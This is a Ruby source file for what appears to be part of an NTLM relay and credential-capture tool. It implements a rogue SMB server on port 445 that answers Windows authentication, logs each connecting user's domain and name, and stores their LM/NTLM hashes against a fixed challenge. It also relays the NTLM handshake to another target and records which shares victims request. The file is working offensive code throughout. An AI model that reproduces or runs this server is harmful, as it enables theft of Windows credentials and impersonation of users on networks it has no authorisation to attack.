#!/usr/bin/env ruby
require 'zfmoduletest'
require 'zfntlm'
require 'zfclient'
require 'zfdb'
module ZFsmb
  class Server
    attr_accessor :server

    def initialize(ipaddr)
      @server = TCPServer.open(ipaddr, 445)
      return @server
    rescue Errno::EADDRINUSE, Errno::EACCES
      puts 'SMB - PORT IN USE OR PERMS'
      return false
    end

    def start
      puts 'Starting smbd server'
      zfdb = ZFdb::DB.new
      loop do
        Thread.start(@server.accept) do |cli|
          # TODO: Catch when connect
          # To Break threading for dev
          # cli = @server.accept
          #

          puts "NEW SMBd CONNECTION [  #{cli.peeraddr[3]}  ]"
          uid = sessid = clientconn = nil # to define context of variable
          count = 1 # debuging count :p
          begin
            loop do

              q, x = cli.recvfrom(2000)
              req = Client.new(q)

              if (req.smbcmd == "\x72") # SMBNEGO
                resp = SmbNegProtoRespa.new(q)
                cli.write(resp.getpacket)

              elsif (req.smbcmd == "\x73") # SetupAndX / SPNEGO TIME!
                ntlmreq = ZFsmb::Parsentlmfromspnego(req.bdata)
                ntlmmsg = ZFNtlm::Message.new(ntlmreq)

                if ntlmmsg.type == 1 # if type 1 send type2
                  a = ZFNtlm::Message.new
                  if uid.nil?
                    resp = SetupAndXResp.new(q,ZFsmb::Buildtype2gssapi(a.buildtype2))
                  else
                    clientconn = ZFClient::Router.new(uid, 7)
                    resp = SetupAndXResp.new(q, ZFsmb::Buildtype2gssapi(clientconn.sendtype1(ntlmreq)))
                  end
                  resp.smbstatus = "\x16\x00\x00\xc0"
                  cli.write(resp.getpacket)
                elsif ntlmmsg.type == 3 # if type 3 send OK
                  # TODO: GET NTLM data and relay it!
                  ntlmmsg.parsetype3
                  if uid.nil?
                    puts "SMB user: #{ntlmmsg.domain} \\ #{ntlmmsg.username}"
                    uid = zfdb.Getuserid(ntlmmsg.username,ntlmmsg.domain)
                    sessid = zfdb.Newsession(uid, ntlmmsg.hostname, 0,
                                             cli.peeraddr[3], 1, "\IPC$")
                    zfdb.StoreHash(uid, ntlmmsg.lmhash, ntlmmsg.ntlmhash,
                                   '1122334455667788', sessid, Base64.encode64(ntlmreq))
                  else
                    # puts "Passing type3"
                    # zftest
                    pos = q.index(/\x4e\x54\x4c\x4d\x53\x53\x50/)
                    if q[pos - 3, 1] == "\x82"
                      len = q[pos - 2, 2].unpack('n')[0]
                    else
                      len = q[pos - 1, 1].unpack('C')[0]
                    end
                    signdata = q[pos + len, 20]
                    # zftest
                    Thread.start { clientconn.sendtype3(ntlmreq, q) }
                  end
                  resp = SetupAndXResp.new(q, "\xa1\x07\x30\x05\xa0\x03\x0a\x01\x00")
                  count += 1
                  cli.write(resp.getpacket)

                else
                  puts "shit's fucked up"
                end
              elsif (req.smbcmd == "\x75") then # TreeConnectAndX

                path = q[/(\x5c\x00\x5c\x00.*\x00\x00)/].unpack('M*')[0].gsub("\x00", "") # lazy detection of file share
                begin
                  # TODO: detect if IPC$ and don't log it.
                  if !(path.include? 'IPC$')
                    zfdb.Setsessionpath(sessid, path)
                  end
                rescue
                  puts $ERROR_INFO
                end
                resp = SMBReauth.new(q)
                cli.write(resp.getpacket)

              else
                puts "unnknown! - #{[req.smbcmd].unpack('H*')} "
                # puts "unknown!"
              end
            end
          rescue
            zfdb.Endsession(sessid)
            puts "Session Died for #{uid}"
          end
        end
      end
      #
      # Comment one to get rid of threading
      #
    end
  end
end
